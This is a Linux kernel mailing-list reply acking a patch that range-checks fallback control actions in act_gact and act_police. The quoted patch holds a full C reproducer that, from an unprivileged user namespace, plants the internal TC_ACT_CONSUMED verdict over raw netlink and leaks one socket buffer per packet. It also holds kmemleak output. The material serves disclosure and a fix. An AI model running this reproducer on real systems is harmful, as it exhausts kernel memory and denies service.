Received: from mail-pf1-f170.google.com (mail-pf1-f170.google.com [209.85.210.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D8D0F3BE643
	for <stable@vger.kernel.org>; Thu,  6 Aug 2026 18:48:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.170
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786042122; cv=pass; b=kDtoHkSCcbo3UGLfm8F08Sp3OIqTMNTbCjpQnDLY12PgU3gasL3yt3kVPRSHkN1fn88pfQG5HQ0quzmw/wGsze5mtrwGZIpu/++NpithU/T5zIpb3Rw7RqfmO5AsUg81OPLx2+UHFQIlFE+KX786/l3+0LMK4P3Fo73kEHrrfto=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786042122; c=relaxed/simple;
	bh=8kYcZ/R5eI28iAUrcLiD4wHfVw5jk3JyfQc2Cpx7Z3E=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=rqO34LZCcBDMVzdspS+FBcRMSabHk5wQfZjo4sYI7cRFjRjZsE+beklo34yAoc3xY8BO5X5VXlYM76B4l1uJR8oCeATNcWhqI+d44LYeUyY8UmA9sT3va9h3AqTUDEUR1uRJrrKTnDKNnfbKt26wJ7fgIh6eYy6GFd7E8FOe5kA=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (1024-bit key) header.d=mojatatu.com header.i=@mojatatu.com header.b=M2r7yHFS; arc=pass smtp.client-ip=209.85.210.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=mojatatu.com header.i=@mojatatu.com header.b="M2r7yHFS"
Received: by mail-pf1-f170.google.com with SMTP id d2e1a72fcca58-8487b7b3fc8so3051591b3a.3
        for <stable@vger.kernel.org>; Thu, 06 Aug 2026 11:48:39 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1786042119; cv=none;
        d=google.com; s=arc-20260327;
        b=AzOASVQrg5OByUZ6BG2pf//E6g9Mo5s45dKdg8o4kjbmXiHMOfvRqgJNgSdsC0IweH
         dVy4wCc9IJcbT3PP1jFL2rwe8emvBK2LmquDqqPidYDuunv5j0ya7+efPSjFH0ubQ3L2
         pGTDb9Juh29cZFsq/eu4mbRr/rQEabfMQI2SvN9qfQpTNZBE/Fdr/A0HxyOhl3FvrEgu
         zmNszanp6QAngh0SF4z3j5yfPHk6DEEaSeuPuncDXMspvZ73kKbmEpEE4707hRXP2ytX
         g3F+32iiaIYZcaNHAkKezrBWhVDIwvH9qiFXLV3lt33oTtDfxyMK7/+Gvn0vSNOWIgzg
         vHcA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=ifWfrx5C4bl2qGCqpmeZLXOpzfBLuzawp+mpuJ7TMAo=;
        fh=ySAg5kgAfMKhmXH5wrfq4SR8mJmFKM9SQyvtCVfxNWk=;
        b=LVVBQdj0ILw7YX4YlZcrgwElRHVrRr5+ZbUqdjEG6Cs1YZUNA609BaXrLpTGeuVV1S
         1PkKjc2xpN2U6GD5+xIM+JJnJc3iFRVmP5QrYOCpEFszzqBnZ/9YEORfydQOFBSK+lLq
         mHGUW1ipGzrnodme4JAkYiHvSkhMHbOuW2/AFn08dVzM6WH7wCEmAZbRr2tZflrvfNZj
         FQSKazGWY1KOLST/Mlz4rXoSHB+2x0optVf5gQyU5fzv7nUn57TreSIzx4IxB3PI+bUz
         9MBpSveHfp3G6Mbr4k8URFOZKam8tNCxylAUFjSZKkQU+cKmxDmlvL9T0jHOaVBVd9Ex
         te2g==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu.com; s=google; t=1786042119; x=1786646919; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=ifWfrx5C4bl2qGCqpmeZLXOpzfBLuzawp+mpuJ7TMAo=;
        b=M2r7yHFSyQ+MLW22jIhIsnXLvEG72aWtsiHTVu5z83jjCas82HHLfULa27ZEvA2Kqi
         VTUAZIjbe4M17ALqwJ8hKnIkmVlc1BRSIru2xV1A1WTnee/6j2GblA6kCZWSym7Ehsqc
         +AkR7QxCd31CqHdDTJrwhVB3KLrgclhs1nh6w=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786042119; x=1786646919;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=ifWfrx5C4bl2qGCqpmeZLXOpzfBLuzawp+mpuJ7TMAo=;
        b=Rc0T6DW5DO/D4T3ISDJ2rczZs/yrcFGZlqUBXQ8YmqFfLGB7OLyAyZHrxllocXkN/p
         nRC/TlgSMybPBdigyTWDE4DSVah1i7CNlwWDEYaOOXhXHwe9Dgr52tErXp9GntWVI9vC
         +pAsfFQE8xTkHMm42Q3BI99qn3uvqvEKfoVAocrlfZZAHrGXklEeruCHkp5Fg5VDSvFM
         eLxFZomIyJh3IPLKA022MJNA75+JiTOPTEcRxoe5SKvat7NtW7G9vrnYKwp26OWSjWFx
         sjydE/TSL8bKkTA3wCxeneuS3IU8doNpGKTFkyQWcjv60D7nayMmr5YG/tneptUUORyS
         gjPw==
X-Forwarded-Encrypted: i=1; AHgh+RrclgGbUXUQHoBYxVHUU54j5Vvqby4eBrR4SnEXKF54FNCAW5cHlfJkiE/m99uibmbPOim2aFE=@vger.kernel.org
X-Gm-Message-State: AOJu0YwRMSpBPjPvtRHOiIhKWZjy3epX0mI/P4PVBUMbS6n5+pKuUt24
	cpgEyLnrQReoLdokWrZ2Z66dwjIGqu+C6jA4NvIMpKCNCA31B96h4KD3kBr73QGDdlVI59QmGr5
	qfN+rEdOft+TWVhDwUggAAimhOv2LqWkI+p07eTkM
X-Gm-Gg: AR+sD112f4gHvf557COFJBBbd9xjsCfetqynhxg6BuiNYYsNdlWEUCez+GD4+M9RUSh
	QIny2c1aXs+W15y7ClAb0XsucABsTf9MyogDnQ1V3CLLIu8LeVVO9mD6IPPZtVb7Iug1bc+W7Sv
	c8Q2glsdivJtmt7odidXMRut5+WjfoRUsWOCuYrDEiJfVhPJz6uk5BFfdAXs9d4PBLODz734tPG
	L8nVKE3hvxAxOJLYmAHKXvGJo/abe0St1uSYkPao3DKYHanFW0PJ/uR2XBWo0j7+JCYOnTT1Hiv
	RoEXuh3PKQFPW7JxHs8fJcGHZgg5NN5r7g5mbv3SONjU0c4KqMthpdFG
X-Received: by 2002:a05:6a00:94e7:b0:848:3f91:da82 with SMTP id
 d2e1a72fcca58-84f2e12c1fcmr19676965b3a.32.1786042118950; Thu, 06 Aug 2026
 11:48:38 -0700 (PDT)
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260806101252.809593-1-hj351016@gmail.com>
In-Reply-To: <20260806101252.809593-1-hj351016@gmail.com>
From: Jamal Hadi Salim <jhs@mojatatu.com>
Date: Thu, 6 Aug 2026 14:48:27 -0400
X-Gm-Features: AUfX_myIJryt_hbMw20bjXyj6YK4e1XBJOi9XOVNtlgi4TOKT-LmgCgtDQopSwc
Message-ID: <CAM0EoM=ASb3_KEH4xOBKGGNuQjXEb=YFicFFMFPos9zSNW03Wg@mail.gmail.com>
Subject: Re: [PATCH net v2] net/sched: act_gact, act_police: range check the
 fallback control action
To: Hyunjung Ko <hj351016@gmail.com>
Cc: "David S . Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>, 
	Jiri Pirko <jiri@resnulli.us>, netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
	stable@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Thu, Aug 6, 2026 at 6:13=E2=80=AFAM Hyunjung Ko <hj351016@gmail.com> wro=
te:
>
> tcf_action_check_ctrlact() range checks the primary control action:
>
>         if (!opcode)
>                 ret =3D action > TC_ACT_VALUE_MAX ? -EINVAL : 0;
>
> TC_ACT_VALUE_MAX is TC_ACT_TRAP, so kernel-internal verdicts above it
> cannot be set that way. But act_gact and act_police each carry a second,
> independent control action supplied by user space that never reaches that
> helper - TCA_GACT_PROB.paction and TCA_POLICE_RESULT. Both only reject
> TC_ACT_GOTO_CHAIN, so any other value is stored verbatim and returned
> verbatim from the action.
>
> In particular user space can store TC_ACT_CONSUMED, which is
> TC_ACT_VALUE_MAX + 1 and is deliberately not part of the UAPI value
> range. That verdict tells every caller the action took ownership of the
> skb, so nobody frees it: sch_handle_ingress(), sch_handle_egress() and
> tcf_qevent_handle() all deliberately skip the free for it. The result is
> one leaked sk_buff plus its data buffer per packet traversing the filter,
> unbounded, for all traffic on the chain including kernel-generated
> packets.
>
> Both are trivially deterministic. act_gact clamps tcfg_pval to >=3D 1, so
> with pval =3D 1 gact_determ() returns the fallback for every packet.
> act_police has no mandatory rate, so rate =3D 0 leaves tcfp_mtu =3D ~0 an=
d
> tcf_police_mtu_check() always passes.
>
> TC_ACT_CONSUMED was added by commit 720f22fed81b ("net: sched: refactor
> reinsert action"), after both goto-chain guards were written:
> commit 9469f375ab09 ("net/sched: act_gact: disallow 'goto chain' on
> fallback control action") and
> commit c08f5ed5d625 ("net/sched: act_police: disallow 'goto chain' on
> fallback control action"). Neither guard was widened when the new
> verdict appeared.
>
> Factor the existing range test out of tcf_action_check_ctrlact() as
> tcf_action_valid() and apply it to both fallbacks. The helper cannot call
> tcf_action_check_ctrlact() directly because that also allocates a
> goto_chain, which is exactly what these two sites must not do.
>
> Reproduced on v7.2-rc6: kmemleak reports one leaked 232-byte
> skbuff_head_cache object plus its 704-byte data buffer per packet. With
> this patch both configurations are rejected with -EINVAL and kmemleak
> reports none.
>
> Fixes: 720f22fed81b ("net: sched: refactor reinsert action")
> Cc: stable@vger.kernel.org # v5.3+
> Assisted-by: Anthropic-Claude-Code:Claude-Opus-5
> Signed-off-by: Hyunjung Ko <hj351016@gmail.com>


Thanks for the repro. Patch looks sane.

Acked-by: Jamal Hadi Salim <jhs@mojatatu.com>

cheers,
jamal


> ---
>  include/net/act_api.h  | 19 +++++++++++++++++++
>  net/sched/act_gact.c   |  5 +++++
>  net/sched/act_police.c |  6 ++++++
>  3 files changed, 30 insertions(+)
>
> v2:
>  - add Assisted-by: tag
>  - explain below why no tdc case is possible; C reproducer offered
>  - no functional change
> v1: https://lore.kernel.org/netdev/20260805095527.204088-1-hj351016@gmail=
.com/
>
> No tdc selftest accompanies this one, unlike the act_ct fix: tdc drives
> tc(8), and iproute2 only parses symbolic control-action names, so the bad
> value cannot be expressed at all.
>
>   $ tc actions add action gact drop random determ ok 2
>   RTNETLINK answers: Operation not permitted   <- parsed fine
>   $ tc actions add action gact drop random determ 9 2
>   Bad action type 9                            <- rejected by iproute2
>
> The fallback therefore has to be planted over raw netlink. Self-contained
> reproducer below; on an unpatched kernel it prints
>
>   gact    fallback =3D 9 (TC_ACT_CONSUMED): ACCEPTED BY THE KERNEL
>           skbuff_head_cache 140 -> 364 (+224) after 200 packets
>
>   police  fallback =3D 9 (TC_ACT_CONSUMED): ACCEPTED BY THE KERNEL
>           skbuff_head_cache 364 -> 560 (+196) after 200 packets
>
> and with this patch applied both filters are refused with -EINVAL
> "invalid fallback control action" and nothing leaks.
>
> 8<--------------------------------------------------
> // SPDX-License-Identifier: GPL-2.0
> /*
>  * act_gact / act_police accept an out-of-range fallback control action.
>  *
>  * tc(8) cannot express this: iproute2 only parses symbolic action names,=
 so
>  * the value has to be planted over raw netlink. Build and run as an
>  * unprivileged user (needs unprivileged userns) or as root:
>  *
>  *      gcc -O2 -o repro repro.c && ./repro
>  *
>  * Needs CONFIG_NET_ACT_GACT + CONFIG_GACT_PROB, CONFIG_NET_ACT_POLICE.
>  * Add CONFIG_DEBUG_KMEMLEAK and boot with kmemleak=3Don to see the leake=
d
>  * objects; /proc/slabinfo alone is enough to see the growth.
>  */
> #define _GNU_SOURCE
> #include <arpa/inet.h>
> #include <errno.h>
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/rtnetlink.h>
> #include <net/if.h>
> #include <sched.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <fcntl.h>
> #include <unistd.h>
>
> #define TC_H_CLSACT     0xFFFFFFF1U
> #define TC_H_MIN_INGRESS 0xFFF2U
> #define TCA_KIND_       1
> #define TCA_OPTIONS_    2
> #define TCA_ACT_KIND_   1
> #define TCA_ACT_OPTIONS_ 2
> #define TCA_MATCHALL_ACT_ 2
> #define TCA_GACT_PARMS_ 2
> #define TCA_GACT_PROB_  3
> #define TCA_POLICE_TBF_ 1
> #define TCA_POLICE_RESULT_ 5
> #define PGACT_DETERM_   2
> #define BAD_ACTION      9               /* TC_ACT_CONSUMED, kernel-intern=
al */
>
> struct tc_gen { __u32 index, capab; int action, refcnt, bindcnt; };
> struct tc_gact_p_ { __u16 ptype, pval; int paction; };
> struct tc_ratespec_ { __u8 cell_log, linklayer; __u16 overhead;
>                       __s16 cell_align; __u16 mpu; __u32 rate; };
> struct tc_police_ { __u32 index; int action; __u32 limit, burst, mtu;
>                     struct tc_ratespec_ rate, peakrate;
>                     int refcnt, bindcnt; __u32 capab; };
>
> static int nl;
> static char extack[256];
>
> struct req { struct nlmsghdr n; char buf[2048]; };
>
> static void *tail(struct nlmsghdr *n) { return (char *)n + NLMSG_ALIGN(n-=
>nlmsg_len); }
>
> static void addattr(struct nlmsghdr *n, int type, const void *d, int len)
> {
>         struct rtattr *rta =3D tail(n);
>
>         rta->rta_type =3D type;
>         rta->rta_len =3D RTA_LENGTH(len);
>         if (len)
>                 memcpy(RTA_DATA(rta), d, len);
>         n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(rta->rta_l=
en);
> }
>
> static void addstr(struct nlmsghdr *n, int t, const char *s)
> {
>         addattr(n, t, s, strlen(s) + 1);
> }
>
> static struct rtattr *nest(struct nlmsghdr *n, int t)
> {
>         struct rtattr *r =3D tail(n);
>
>         addattr(n, t | NLA_F_NESTED, NULL, 0);
>         return r;
> }
>
> static void unnest(struct nlmsghdr *n, struct rtattr *r)
> {
>         r->rta_len =3D (char *)tail(n) - (char *)r;
> }
>
> static int talk(struct nlmsghdr *n)
> {
>         char rbuf[8192];
>         struct iovec iov =3D { n, n->nlmsg_len };
>         struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
>         struct msghdr m =3D { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
>         static __u32 seq =3D 1;
>         struct nlmsghdr *h;
>         ssize_t len;
>
>         n->nlmsg_seq =3D ++seq;
>         n->nlmsg_flags |=3D NLM_F_ACK;
>         extack[0] =3D '\0';
>         if (sendmsg(nl, &m, 0) < 0)
>                 return -errno;
>         iov.iov_base =3D rbuf; iov.iov_len =3D sizeof(rbuf);
>         len =3D recvmsg(nl, &m, 0);
>         if (len < 0)
>                 return -errno;
>         for (h =3D (void *)rbuf; NLMSG_OK(h, (unsigned)len); h =3D NLMSG_=
NEXT(h, len)) {
>                 struct nlmsgerr *e =3D NLMSG_DATA(h);
>                 struct rtattr *rta;
>                 int hlen =3D sizeof(*e), rl;
>
>                 if (h->nlmsg_type !=3D NLMSG_ERROR)
>                         continue;
>                 if (e->error && (h->nlmsg_flags & NLM_F_ACK_TLVS)) {
>                         if (!(h->nlmsg_flags & NLM_F_CAPPED))
>                                 hlen +=3D e->msg.nlmsg_len - NLMSG_HDRLEN=
;
>                         rta =3D (void *)((char *)e + hlen);
>                         rl =3D h->nlmsg_len - NLMSG_HDRLEN - hlen;
>                         for (; RTA_OK(rta, rl); rta =3D RTA_NEXT(rta, rl)=
)
>                                 if ((rta->rta_type & NLA_TYPE_MASK) =3D=
=3D 1)
>                                         snprintf(extack, sizeof(extack), =
"%.*s",
>                                                  (int)RTA_PAYLOAD(rta),
>                                                  (char *)RTA_DATA(rta));
>                 }
>                 return e->error;
>         }
>         return 0;
> }
>
> static void init(struct req *r, int type, int flags, size_t hdr)
> {
>         memset(r, 0, sizeof(*r));
>         r->n.nlmsg_len =3D NLMSG_LENGTH(hdr);
>         r->n.nlmsg_type =3D type;
>         r->n.nlmsg_flags =3D NLM_F_REQUEST | flags;
> }
>
> static int veth_add(void)
> {
>         struct req r;
>         struct rtattr *li, *data, *peer;
>         struct ifinfomsg ph =3D {};
>
>         init(&r, RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL, sizeof(struct if=
infomsg));
>         addstr(&r.n, IFLA_IFNAME, "veth0");
>         li =3D nest(&r.n, IFLA_LINKINFO);
>         addstr(&r.n, IFLA_INFO_KIND, "veth");
>         data =3D nest(&r.n, IFLA_INFO_DATA);
>         peer =3D nest(&r.n, 1 /* VETH_INFO_PEER */);
>         memcpy(tail(&r.n), &ph, sizeof(ph));
>         r.n.nlmsg_len =3D NLMSG_ALIGN(r.n.nlmsg_len) + NLMSG_ALIGN(sizeof=
(ph));
>         addstr(&r.n, IFLA_IFNAME, "veth1");
>         unnest(&r.n, peer); unnest(&r.n, data); unnest(&r.n, li);
>         return talk(&r.n);
> }
>
> static int link_up(const char *dev)
> {
>         struct req r;
>         struct ifinfomsg *i;
>
>         init(&r, RTM_NEWLINK, 0, sizeof(*i));
>         i =3D NLMSG_DATA(&r.n);
>         i->ifi_family =3D AF_UNSPEC;
>         i->ifi_index =3D if_nametoindex(dev);
>         i->ifi_flags =3D i->ifi_change =3D IFF_UP;
>         return talk(&r.n);
> }
>
> static int clsact_add(void)
> {
>         struct req r;
>         struct tcmsg *t;
>
>         init(&r, RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL, sizeof(*t));
>         t =3D NLMSG_DATA(&r.n);
>         t->tcm_family =3D AF_UNSPEC;
>         t->tcm_ifindex =3D if_nametoindex("veth0");
>         t->tcm_parent =3D TC_H_CLSACT;
>         t->tcm_handle =3D 0xFFFF0000U;
>         addstr(&r.n, TCA_KIND_, "clsact");
>         return talk(&r.n);
> }
>
> /* matchall + gact|police whose *fallback* control action is @fallback */
> static int filter_add(const char *kind, int fallback)
> {
>         struct req r;
>         struct tcmsg *t;
>         struct rtattr *o, *acts, *a1, *ao;
>         struct tc_gen parm =3D {};
>
>         init(&r, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL, sizeof(*t));
>         t =3D NLMSG_DATA(&r.n);
>         t->tcm_family =3D AF_UNSPEC;
>         t->tcm_ifindex =3D if_nametoindex("veth0");
>         t->tcm_parent =3D 0xFFFF0000U | TC_H_MIN_INGRESS;
>         t->tcm_info =3D (1u << 16) | htons(ETH_P_ALL);
>         addstr(&r.n, TCA_KIND_, "matchall");
>         o =3D nest(&r.n, TCA_OPTIONS_);
>         acts =3D nest(&r.n, TCA_MATCHALL_ACT_);
>         a1 =3D nest(&r.n, 1);
>         addstr(&r.n, TCA_ACT_KIND_, kind);
>         ao =3D nest(&r.n, TCA_ACT_OPTIONS_);
>         if (!strcmp(kind, "gact")) {
>                 /* ptype =3D PGACT_DETERM, pval =3D 1 -> gact_determ() re=
turns the
>                  * fallback for every packet (tcfg_pval is clamped to >=
=3D 1). */
>                 struct tc_gact_p_ prob =3D { PGACT_DETERM_, 1, fallback }=
;
>
>                 addattr(&r.n, TCA_GACT_PARMS_, &parm, sizeof(parm));
>                 addattr(&r.n, TCA_GACT_PROB_, &prob, sizeof(prob));
>         } else {
>                 /* rate =3D 0 leaves tcfp_mtu =3D ~0, so tcf_police_mtu_c=
heck() is
>                  * always true and tcf_police_act() returns tcfp_result. =
*/
>                 struct tc_police_ pol =3D {};
>
>                 addattr(&r.n, TCA_POLICE_TBF_, &pol, sizeof(pol));
>                 addattr(&r.n, TCA_POLICE_RESULT_, &fallback, sizeof(fallb=
ack));
>         }
>         unnest(&r.n, ao); unnest(&r.n, a1); unnest(&r.n, acts); unnest(&r=
.n, o);
>         return talk(&r.n);
> }
>
> static int filter_flush(void)
> {
>         struct req r;
>         struct tcmsg *t;
>
>         init(&r, RTM_DELTFILTER, 0, sizeof(*t));
>         t =3D NLMSG_DATA(&r.n);
>         t->tcm_family =3D AF_UNSPEC;
>         t->tcm_ifindex =3D if_nametoindex("veth0");
>         t->tcm_parent =3D 0xFFFF0000U | TC_H_MIN_INGRESS;
>         return talk(&r.n);
> }
>
> static long skbs(void)
> {
>         char l[512];
>         FILE *f =3D fopen("/proc/slabinfo", "r");
>         long a =3D -1;
>
>         if (!f)
>                 return -1;
>         while (fgets(l, sizeof(l), f)) {
>                 char n[128]; long act, num;
>
>                 if (sscanf(l, "%127s %ld %ld", n, &act, &num) =3D=3D 3 &&
>                     !strcmp(n, "skbuff_head_cache")) { a =3D act; break; =
}
>         }
>         fclose(f);
>         return a;
> }
>
> static void inject(int n)
> {
>         unsigned char f[54] =3D { [0 ... 5] =3D 0xaa, [6 ... 11] =3D 0xbb=
 };
>         struct sockaddr_ll s =3D { .sll_family =3D AF_PACKET, .sll_halen =
=3D 6 };
>         int fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)), i;
>
>         f[12] =3D 0x86; f[13] =3D 0xdd;     /* IPv6 */
>         f[14] =3D 0x60; f[20] =3D 59; f[21] =3D 64;   /* nexthdr NONE, ho=
p limit */
>         s.sll_ifindex =3D if_nametoindex("veth1");
>         memset(s.sll_addr, 0xaa, 6);
>         if (fd < 0 || bind(fd, (struct sockaddr *)&s, sizeof(s)) < 0)
>                 return;
>         for (i =3D 0; i < n; i++)
>                 sendto(fd, f, sizeof(f), MSG_DONTWAIT,
>                        (struct sockaddr *)&s, sizeof(s));
>         usleep(400000);
>         close(fd);
> }
>
> static void run(const char *kind)
> {
>         long before, after;
>         int rc;
>
>         filter_flush();
>         rc =3D filter_add(kind, BAD_ACTION);
>         printf("\n%-7s fallback =3D %d (TC_ACT_CONSUMED): %s%s%s\n", kind=
,
>                BAD_ACTION, rc ? "REJECTED" : "ACCEPTED BY THE KERNEL",
>                rc && extack[0] ? " -- " : "", rc ? extack : "");
>         if (rc)
>                 return;
>         before =3D skbs();
>         inject(200);
>         after =3D skbs();
>         printf("        skbuff_head_cache %ld -> %ld (%+ld) after 200 pac=
kets\n",
>                before, after, after - before);
> }
>
> int main(void)
> {
>         struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
>         char b[64];
>         int on =3D 1, fd;
>         uid_t uid =3D getuid();
>
>         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) =3D=3D 0) {
>                 fd =3D open("/proc/self/setgroups", O_WRONLY);
>                 if (fd >=3D 0) { write(fd, "deny", 4); close(fd); }
>                 snprintf(b, sizeof(b), "0 %d 1", getgid());
>                 fd =3D open("/proc/self/gid_map", O_WRONLY);
>                 if (fd >=3D 0) { write(fd, b, strlen(b)); close(fd); }
>                 snprintf(b, sizeof(b), "0 %d 1", uid);
>                 fd =3D open("/proc/self/uid_map", O_WRONLY);
>                 if (fd >=3D 0) { write(fd, b, strlen(b)); close(fd); }
>         } else if (unshare(CLONE_NEWNET)) {
>                 perror("unshare"); return 1;
>         }
>
>         nl =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
>         setsockopt(nl, SOL_NETLINK, 11 /* NETLINK_EXT_ACK */, &on, sizeof=
(on));
>         if (bind(nl, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
>                 perror("bind"); return 1;
>         }
>         if (veth_add() || link_up("veth0") || link_up("veth1") || clsact_=
add()) {
>                 fprintf(stderr, "setup failed\n"); return 1;
>         }
>
>         run("gact");
>         run("police");
>         printf("\nA fixed kernel rejects both with -EINVAL and leaks noth=
ing.\n");
>         return 0;
> }
> -------------------------------------------------->8
>
> Reproducer needs CONFIG_NET_ACT_GACT + CONFIG_GACT_PROB and
> CONFIG_NET_ACT_POLICE, plus CONFIG_DEBUG_KMEMLEAK and kmemleak=3Don to
> observe it.
>
> The bad value cannot be set with tc(8) - iproute2 only parses symbolic
> action names - so the fallback has to be planted over raw netlink:
> TCA_GACT_PROB.paction =3D 9 with ptype =3D PGACT_DETERM and pval =3D 1, o=
r
> TCA_POLICE_RESULT =3D 9 with rate =3D 0. Attach either to a clsact ingres=
s
> chain and every packet leaks its skb.
>
> Before, one sk_buff plus its data buffer per packet:
>
>   kmemleak: 166 new suspected memory leaks
>   unreferenced object 0xffff888103baadc0 (size 232):
>     kmem_cache_alloc_node_noprof+0x2f1/0x3e0
>     __alloc_skb+0xe5/0x860
>     alloc_skb_with_frags+0x82/0x750
>     sock_alloc_send_pskb+0x658/0x7e0
>     packet_sendmsg+0x1833/0x4860
>     __x64_sys_sendto+0xe0/0x1c0
>     do_syscall_64+0x102/0x5a0
>
> After: both configurations are rejected at netlink time with -EINVAL
> and "invalid fallback control action", and kmemleak reports no
> unreferenced objects.
>
> For the same reason tdc cannot express the bad configuration, so no
> selftest accompanies this patch. A self-contained C reproducer is
> available on request.
>
> diff --git a/include/net/act_api.h b/include/net/act_api.h
> index 20d9e55f8564..fd03f6319e88 100644
> --- a/include/net/act_api.h
> +++ b/include/net/act_api.h
> @@ -270,6 +270,25 @@ int tcf_action_check_ctrlact(int action, struct tcf_=
proto *tp,
>  struct tcf_chain *tcf_action_set_ctrlact(struct tc_action *a, int action=
,
>                                          struct tcf_chain *newchain);
>
> +/* Range check for a control action supplied by user space.
> + *
> + * This is the same test tcf_action_check_ctrlact() applies to the prima=
ry
> + * control action, factored out for the *fallback* control actions
> + * (act_gact's TCA_GACT_PROB.paction and act_police's TCA_POLICE_RESULT)=
,
> + * which must not reach tcf_action_check_ctrlact() because they have no
> + * goto_chain to allocate.  Without it, user space can store kernel-inte=
rnal
> + * verdicts such as TC_ACT_CONSUMED, which is TC_ACT_VALUE_MAX + 1 and i=
s
> + * deliberately not part of the UAPI value range.
> + */
> +static inline bool tcf_action_valid(int action)
> +{
> +       int opcode =3D TC_ACT_EXT_OPCODE(action);
> +
> +       if (!opcode)
> +               return action <=3D TC_ACT_VALUE_MAX;
> +       return opcode <=3D TC_ACT_EXT_OPCODE_MAX || action =3D=3D TC_ACT_=
UNSPEC;
> +}
> +
>  #ifdef CONFIG_INET
>  DECLARE_STATIC_KEY_FALSE(tcf_frag_xmit_count);
>  #endif
> diff --git a/net/sched/act_gact.c b/net/sched/act_gact.c
> index e949280eb800..565860cccba6 100644
> --- a/net/sched/act_gact.c
> +++ b/net/sched/act_gact.c
> @@ -89,6 +89,11 @@ static int tcf_gact_init(struct net *net, struct nlatt=
r *nla,
>                 p_parm =3D nla_data(tb[TCA_GACT_PROB]);
>                 if (p_parm->ptype >=3D MAX_RAND)
>                         return -EINVAL;
> +               if (!tcf_action_valid(p_parm->paction)) {
> +                       NL_SET_ERR_MSG(extack,
> +                                      "invalid fallback control action")=
;
> +                       return -EINVAL;
> +               }
>                 if (TC_ACT_EXT_CMP(p_parm->paction, TC_ACT_GOTO_CHAIN)) {
>                         NL_SET_ERR_MSG(extack,
>                                        "goto chain not allowed on fallbac=
k");
> diff --git a/net/sched/act_police.c b/net/sched/act_police.c
> index b16468a98c55..ce08f6840ef7 100644
> --- a/net/sched/act_police.c
> +++ b/net/sched/act_police.c
> @@ -128,6 +128,12 @@ static int tcf_police_init(struct net *net, struct n=
lattr *nla,
>
>         if (tb[TCA_POLICE_RESULT]) {
>                 tcfp_result =3D nla_get_u32(tb[TCA_POLICE_RESULT]);
> +               if (!tcf_action_valid(tcfp_result)) {
> +                       NL_SET_ERR_MSG(extack,
> +                                      "invalid fallback control action")=
;
> +                       err =3D -EINVAL;
> +                       goto failure;
> +               }
>                 if (TC_ACT_EXT_CMP(tcfp_result, TC_ACT_GOTO_CHAIN)) {
>                         NL_SET_ERR_MSG(extack,
>                                        "goto chain not allowed on fallbac=
k");
> --
> 2.43.0
